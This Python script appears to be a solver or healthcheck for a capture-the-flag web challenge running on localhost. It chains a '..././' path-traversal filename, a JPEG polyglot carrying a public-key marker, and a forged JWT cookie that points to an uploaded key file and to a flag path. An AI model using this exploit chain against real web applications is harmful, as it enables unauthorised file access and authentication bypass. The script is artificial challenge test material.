#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests

url = 'http://localhost:1337/upload'

jpeg = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\t\x08\n\n\t\x08\t\t\n\x0c\x0f\x0c\n\x0b\x0e\x0b\t\t\r\x11\r\x0e\x0f\x10\x10\x11\x10\n\x0c\x12\x13\x12\x10\x13\x0f\x10\x10\x10\xff\xc9\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xcc\x00\x06\x00\x10\x10\x05\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xd2\xcf \xff\xd9BEGIN PUBLIC KEY'

files = {"file": ("..././..././..././..././..././proc/self/map", jpeg)}
data = {"content": "a", "password": "b"}
headers = {"Cookie": "session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsInB1YmtleSI6Ii9hcHAvdXBsb2Fkcy9mZWE5MGU4ZjkyMGU1YjQxZGE0MzEwNmYyOWIzZjhiMS5qcGVnIn0.eyJ1c2VybmFtZSI6ImZpbGVzLy4uLy4uLy4uL2FwcC9mbGFnLnR4dCJ9.VLzOK8W85S-3D6lZyABIIvwDkv1zLF5JEs8Jcl-bXiY"}

r = requests.post(url, files=files, data=data, headers=headers)

if 'idek{' in r.text:
    exit(0)
exit(1)
